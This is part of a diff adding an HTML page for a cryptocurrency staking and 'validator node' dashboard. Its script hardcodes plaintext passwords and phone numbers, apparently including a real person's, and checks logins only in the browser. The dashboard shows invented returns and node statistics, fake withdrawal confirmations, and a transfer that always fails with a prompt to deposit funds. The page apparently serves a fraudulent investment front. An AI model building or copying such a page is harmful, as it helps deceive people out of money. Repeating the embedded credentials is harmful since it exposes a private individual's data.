+                        <p style="color: #8892b0;">Rewards Earned: 0 AVAX</p>
+                        <p style="color: #8892b0;">Lock Period: 14 days</p>
+                        <button class="btn-primary" style="margin-top: 20px;">Stake AVAX</button>
+                    </div>
+                </div>
+
+                <!-- Pool Section -->
+                <div class="section" id="pool">
+                    <h2 class="section-title">Liquidity Pools</h2>
+                    
+                    <div class="pool-card">
+                        <h3>💧 BTC/USDT Pool</h3>
+                        <div class="pool-stats">
+                            <div class="pool-stat">
+                                <div style="color: #8892b0; font-size: 12px;">APR</div>
+                                <div style="color: #00ff88; font-size: 24px; font-weight: bold;">24.5%</div>
+                            </div>
+                            <div class="pool-stat">
+                                <div style="color: #8892b0; font-size: 12px;">TVL</div>
+                                <div style="color: #00d4ff; font-size: 24px; font-weight: bold;">$12.4M</div>
+                            </div>
+                        </div>
+                        <p style="color: #8892b0;">Your Share: 0%</p>
+                        <p style="color: #8892b0;">24h Volume: $847,293</p>
+                        <button class="btn-primary" style="margin-top: 20px;">Add Liquidity</button>
+                    </div>
+                    
+                    <div class="pool-card">
+                        <h3>💧 AVAX/USDT Pool</h3>
+                        <div class="pool-stats">
+                            <div class="pool-stat">
+                                <div style="color: #8892b0; font-size: 12px;">APR</div>
+                                <div style="color: #00ff88; font-size: 24px; font-weight: bold;">31.2%</div>
+                            </div>
+                            <div class="pool-stat">
+                                <div style="color: #8892b0; font-size: 12px;">TVL</div>
+                                <div style="color: #00d4ff; font-size: 24px; font-weight: bold;">$4.8M</div>
+                            </div>
+                        </div>
+                        <p style="color: #8892b0;">Your Share: 0%</p>
+                        <p style="color: #8892b0;">24h Volume: $382,647</p>
+                        <button class="btn-primary" style="margin-top: 20px;">Add Liquidity</button>
+                    </div>
+                </div>
+
+                <!-- Node Section -->
+                <div class="section" id="node">
+                    <h2 class="section-title">Node Management</h2>
+                    <div class="node-status-card">
+                        <h3>🖥️ Validator Node Configuration</h3>
+                        <div style="margin: 20px 0;">
+                            <p style="color: #8892b0; margin-bottom: 10px;">Node Type: <span style="color: #00ff88;">Validator</span></p>
+                            <p style="color: #8892b0; margin-bottom: 10px;">Status: <span style="color: #00ff88;">● Active</span></p>
+                            <p style="color: #8892b0; margin-bottom: 10px;">Uptime: <span style="color: #00d4ff;">99.98%</span></p>
+                            <p style="color: #8892b0; margin-bottom: 10px;">Delegators: <span style="color: #fff;">147</span></p>
+                            <p style="color: #8892b0; margin-bottom: 10px;">Total Staked: <span style="color: #fff;">250,000 AVAX</span></p>
+                            <p style="color: #8892b0; margin-bottom: 10px;">Commission Rate: <span style="color: #fff;">5%</span></p>
+                            <p style="color: #8892b0; margin-bottom: 10px;">Rewards This Epoch: <span style="color: #ffa500; animation: pulse-live 2s infinite;">Validating...</span></p>
+                        </div>
+                        
+                        <div style="background: rgba(0, 212, 255, 0.1); padding: 15px; border-radius: 8px; margin-top: 20px;">
+                            <p style="color: #00d4ff;">📊 Performance Metrics</p>
+                            <p style="color: #8892b0; font-size: 14px; margin-top: 10px;">Blocks Produced: 1,847</p>
+                            <p style="color: #8892b0; font-size: 14px;">Blocks Missed: 2</p>
+                            <p style="color: #8892b0; font-size: 14px;">Era Points: 98,742</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Transfer Section -->
+                <div class="section" id="transfer">
+                    <h2 class="section-title">Transfer Cryptocurrency</h2>
+                    <div class="form-container">
+                        <h3 style="margin-bottom: 20px;">Send Crypto</h3>
+                        <input type="text" placeholder="Recipient Address or User ID" id="transferRecipient">
+                        <input type="number" placeholder="Amount" id="transferAmount" step="0.0001">
+                        <select id="transferCoin">
+                            <option value="BTC">Bitcoin (BTC)</option>
+                            <option value="ETH">Ethereum (ETH)</option>
+                            <option value="ADA">Cardano (ADA)</option>
+                            <option value="AVAX">Avalanche (AVAX)</option>
+                        </select>
+                        <input type="text" placeholder="Memo (Optional)" id="transferMemo">
+                        <button class="btn-primary" onclick="processTransfer()">Send Transaction</button>
+                        
+                        <div style="margin-top: 20px; padding: 15px; background: rgba(0, 212, 255, 0.1); border-radius: 8px;">
+                            <p style="color: #00d4ff; font-size: 14px;">💡 Network Fee: ~0.0001 BTC</p>
+                            <p style="color: #00d4ff; font-size: 14px;">⚡ Estimated Time: 10-30 minutes</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- History Section -->
+                <div class="section" id="history">
+                    <h2 class="section-title">Transaction History</h2>
+                    <div class="transaction-list" id="transactionList">
+                        <div class="empty-state">
+                            <div class="empty-icon">📊</div>
+                            <div class="empty-title">No Transactions Yet</div>
+                            <div class="empty-description">Start by making your first transaction to see your history here</div>
+                            <button class="btn-primary" onclick="showSection('deposit')">Make Transaction</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // User Database
+        const users = {
+            'user1': {
+                password: 'pass123',
+                name: 'John Doe',
+                phone: '03001234567',
+                nationality: 'Not provided',
+                portfolio: {
+                    BTC: 0,
+                    ETH: 0,
+                    DOT: 0,
+                    ADA: 0,
+                    USDT: 0
+                }
+            },
+            '533833': {
+                password: 'Allah@786',
+                name: 'Ali Bagri',
+                phone: '03039960641',
+                nationality: 'Pakistan',
+                portfolio: {
+                    BTC: 0,
+                    ETH: 0,
+                    DOT: 0,
+                    ADA: 0,
+                    USDT: 0
+                },
+                nodeStatus: {
+                    active: true,
+                    type: 'Validator Node',
+                    round: 3,
+                    publicDate: 'March 17, 2026'
+                }
+            },
+            '55747329': {
+                password: 'Punjab@340',
+                name: 'Premium User',
+                phone: '03331234567',
+                nationality: 'Not provided',
+                portfolio: {
+                    BTC: 0,
+                    ETH: 0,
+                    DOT: 0,
+                    ADA: 0,
+                    USDT: 0
+                }
+            },
+            '35816827': {
+                password: 'AliBhai92',
+                name: 'Staking User',
+                phone: '03211234567',
+                nationality: 'Not provided',
+                portfolio: {
+                    BTC: 0,
+                    ETH: 0,
+                    DOT: 0,
+                    ADA: 0,
+                    USDT: 0
+                }
+            }
+        };
+
+        let prices = {
+            BTC: 67842,
+            ETH: 3524,
+            DOT: 9.45,
+            ADA: 0.58,
+            USDT: 1.00
+        };
+
+        let currentUser = null;
+        let pendingUser = null;
+
+        // Initialize map animation
+        function initializeMapAnimation() {
+            const mapDots = document.getElementById('mapDots');
+            if (!mapDots) return;
+            
+            // Create random node positions
+            for (let i = 0; i < 20; i++) {
+                const dot = document.createElement('div');
+                dot.className = 'node-dot';
+                dot.style.left = Math.random() * 100 + '%';
+                dot.style.top = Math.random() * 100 + '%';
+                dot.style.animationDelay = Math.random() * 2 + 's';
+                mapDots.appendChild(dot);
+            }
+            
+            // Create connection lines
+            for (let i = 0; i < 5; i++) {
+                const line = document.createElement('div');
+                line.className = 'connection-line';
+                line.style.left = Math.random() * 100 + '%';
+                line.style.top = Math.random() * 100 + '%';
+                line.style.width = Math.random() * 200 + 100 + 'px';
+                line.style.transform = `rotate(${Math.random() * 360}deg)`;
+                line.style.animationDelay = Math.random() * 3 + 's';
+                mapDots.appendChild(line);
+            }
+        }
+
+        // Open live map
+        function openLiveMap() {
+            window.open('https://bitnodes.io/nodes/live-map/', '_blank');
+        }
+
+        // Go to user info
+        function goToUserInfo() {
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            document.querySelectorAll('.nav-item')[1].classList.add('active');
+            
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById('userinfo').classList.add('active');
+        }
+
+        // Show Quick Action Info
+        function showQuickAction(action) {
+            const messages = {
+                'deposit': 'Deposit Address Generated!\nMinimum: 0.001 BTC\nProcessing Time: 3 confirmations',
+                'withdraw': 'Daily Withdrawal Limit: 10 BTC\nNetwork Fee: 0.0005 BTC\nAvailable Balance: 0.0000 BTC',
+                'stake': 'Available Staking Options:\n• ADA: 5.2% APY\n• AVAX: 8.7% APY\n• ETH: 4.2% APY',
+                'pool': 'Top Pools:\n• BTC/USDT: 24.5% APR\n• AVAX/USDT: 31.2% APR\n• ETH/USDT: 18.3% APR',
+                'node': 'Node Status: Active\nUptime: 99.98%\nValidators: 147\nNext Reward: Validating...',
+                'transfer': 'P2P Transfer Ready\nNetwork: Mainnet\nGas Fee: Optimized\nSpeed: < 1 minute'
+            };
+            
+            alert(messages[action] || 'Feature information unavailable');
+        }
+
+        // Countdown Timer
+        function startCountdown() {
+            const targetDate = new Date('March 17, 2026 00:00:00').getTime();
+            
+            const updateCountdown = () => {
+                const now = new Date().getTime();
+                const distance = targetDate - now;
+                
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                
+                const countdownElement = document.getElementById('countdown');
+                if (countdownElement) {
+                    countdownElement.textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+                }
+            };
+            
+            updateCountdown();
+            setInterval(updateCountdown, 1000);
+        }
+
+        // Hide phone number
+        function hidePhoneNumber(phone) {
+            if (!phone || phone.length < 10) return '****';
+            return phone.substring(0, 4) + '****' + phone.substring(phone.length - 3);
+        }
+
+        // Login
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (users[username] && users[username].password === password) {
+                pendingUser = username;
+                // Show verification modal
+                document.getElementById('verificationModal').classList.add('active');
+                document.getElementById('hiddenPhone').textContent = hidePhoneNumber(users[username].phone);
+                document.getElementById('loginError').style.display = 'none';
+            } else {
+                document.getElementById('loginError').style.display = 'block';
+            }
+        });
+
+        // Phone Verification
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phoneInput = document.getElementById('phoneVerify').value;
+            
+            if (users[pendingUser] && users[pendingUser].phone === phoneInput) {
+                currentUser = pendingUser;
+                pendingUser = null;
+                
+                // Hide verification modal and login screen
+                document.getElementById('verificationModal').classList.remove('active');
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('dashboard').classList.add('active');
+                
+                // Set user display
+                document.getElementById('userDisplay').textContent = `Welcome, ${users[currentUser].name}`;
+                
+                // Load user data
+                loadPortfolio();
+                loadUserInfo();
+                
+                // Start countdown if needed
+                if (currentUser === '533833') {
+                    startCountdown();
+                }
+                
+                // Clear verification form
+                document.getElementById('phoneVerify').value = '';
+                document.getElementById('verifyError').style.display = 'none';
+            } else {
+                document.getElementById('verifyError').style.display = 'block';
+            }
+        });
+
+        // Logout
+        function logout() {
+            currentUser = null;
+            document.getElementById('dashboard').classList.remove('active');
+            document.getElementById('loginScreen').style.display = 'flex';
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('loginError').style.display = 'none';
+        }
+
+        // Load User Info
+        function loadUserInfo() {
+            const user = users[currentUser];
+            const userInfoContent = document.getElementById('userInfoContent');
+            
+            if (currentUser === '533833') {
+                // Special display for Ali Bagri
+                userInfoContent.innerHTML = `
+                    <div class="user-profile-container">
+                        <div class="user-profile-header">
+                            <div class="user-avatar">AB</div>
+                            <div class="user-details">
+                                <h2>${user.name}</h2>
+                                <p>User ID: ${currentUser}</p>
+                            </div>
+                        </div>
+                        
+                        <div class="info-grid">
+                            <div class="info-card">
+                                <div class="info-label">Phone Number</div>
+                                <div class="info-value">${user.phone}</div>
+                            </div>
+                            <div class="info-card">
+                                <div class="info-label">Nationality</div>
+                                <div class="info-value">${user.nationality}</div>
+                            </div>
+                            <div class="info-card">
+                                <div class="info-label">Account Type</div>
+                                <div class="info-value">Premium Node Validator</div>
+                            </div>
+                            <div class="info-card">
+                                <div class="info-label">Member Since</div>
+                                <div class="info-value">January 2024</div>
+                            </div>
+                        </div>
+                        
+                        <div class="node-status-card">
+                            <div class="node-status-header">
+                                <div class="status-indicator"></div>
+                                <div class="node-status-title">Node is Running</div>
+                            </div>
+                            
+                            <div class="validation-progress">
+                                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                                    <span style="color: #8892b0;">Validation Progress</span>
+                                    <span style="color: #00ff88;">Round 3 Complete</span>
+                                </div>
+                                <div class="progress-bar">
+                                    <div class="progress-fill"></div>
+                                </div>
+                                <p style="color: #8892b0; margin-top: 10px; font-size: 14px;">75% Complete (3/4 rounds)</p>
+                            </div>
+                            
+                            <div class="info-grid" style="margin-top: 20px;">
+                                <div class="info-card">
+                                    <div class="info-label">Node Type</div>
+                                    <div class="info-value">Validator</div>
+                                </div>
+                                <div class="info-card">
+                                    <div class="info-label">Public Blockchain Date</div>
+                                    <div class="countdown-container">
+                                        <div class="countdown-date">📅 March 17, 2026</div>
+                                        <div class="countdown-timer" id="countdown">Loading...</div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="info-card" style="margin-top: 20px;">
+                                <div class="info-label">Reward History</div>
+                                <div class="info-value" style="color: #ffa500;">Available after node goes on Public Blockchain</div>
+                            </div>
+                            
+                            <div class="node-buttons">
+                                <div class="tooltip">
+                                    <button class="btn-disabled" onclick="showNodeMessage()">
+                                        🛑 Stop Node
+                                    </button>
+                                    <span class="tooltip-text">Available after node goes public blockchain</span>
+                                </div>
+                                <div class="tooltip">
+                                    <button class="btn-disabled" onclick="showNodeMessage()">
+                                        💰 Sell Node
+                                    </button>
+                                    <span class="tooltip-text">Available after node goes public blockchain</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                // Start countdown timer
+                startCountdown();
+            } else {
+                // Default user info display
+                userInfoContent.innerHTML = `
+                    <div class="user-profile-container">
+                        <div class="user-profile-header">
+                            <div class="user-avatar">${user.name.charAt(0)}</div>
+                            <div class="user-details">
+                                <h2>${user.name}</h2>
+                                <p>User ID: ${currentUser}</p>
+                            </div>
+                        </div>
+                        
+                        <div class="info-grid">
+                            <div class="info-card">
+                                <div class="info-label">Phone Number</div>
+                                <div class="info-value">${user.phone}</div>
+                            </div>
+                            <div class="info-card">
+                                <div class="info-label">Nationality</div>
+                                <div class="info-value">${user.nationality}</div>
+                            </div>
+                            <div class="info-card">
+                                <div class="info-label">Account Type</div>
+                                <div class="info-value">Standard</div>
+                            </div>
+                            <div class="info-card">
+                                <div class="info-label">Member Since</div>
+                                <div class="info-value">January 2024</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        // Show node message
+        function showNodeMessage() {
+            alert("Available after node goes public blockchain");
+        }
+
+        // Load Portfolio
+        function loadPortfolio() {
+            const portfolio = users[currentUser].portfolio;
+            const gridElement = document.getElementById('portfolioGrid');
+            let totalValue = 0;
+            let html = '';
+            
+            // Show all coins even with 0 balance
+            const allCoins = ['BTC', 'ETH', 'DOT', 'ADA', 'USDT'];
+            
+            allCoins.forEach(coin => {
+                const amount = portfolio[coin] || 0;
+                const value = amount * prices[coin];
+                totalValue += value;
+                
+                html += `
+                    <div class="coin-card">
+                        <div class="coin-header">
+                            <div class="coin-icon ${coin.toLowerCase()}-icon">${getCoinSymbol(coin)}</div>
+                            <div class="coin-symbol">${coin}</div>
+                        </div>
+                        <div class="coin-balance">${amount.toFixed(4)}</div>
+                        <div class="coin-value">≈ $${value.toFixed(2)}</div>
+                    </div>
+                `;
+            });
+            
+            gridElement.innerHTML = html;
+            document.getElementById('totalBalance').textContent = totalValue.toFixed(2);
+        }
+
+        // Get coin symbol
+        function getCoinSymbol(coin) {
+            const symbols = {
+                BTC: '₿',
+                ETH: 'Ξ',
+                DOT: '●',
+                ADA: '₳',
+                USDT: '$'
+            };
+            return symbols[coin] || coin;
+        }
+
+        // Show Section
+        function showSection(sectionName) {
+            // Update nav
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            event.target.closest('.nav-item').classList.add('active');
+            
+            // Update content
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(sectionName).classList.add('active');
+        }
+
+        // Process functions
+        function processWithdraw() {
+            alert('Withdrawal request submitted successfully!\nTransaction ID: TXN' + Math.random().toString(36).substr(2, 9).toUpperCase());
+        }
+
+        function processTransfer() {
+            // Show error instead of success
+            alert('❌ Transaction Failed!\n\nError: Insufficient balance\nRequired: 0.001 BTC\nAvailable: 0.0000 BTC\n\nPlease deposit funds to complete this transaction.');
+        }
+
+        // Initialize map on load
+        window.addEventListener('load', initializeMapAnimation);
+    </script>
+</body>
+</html>
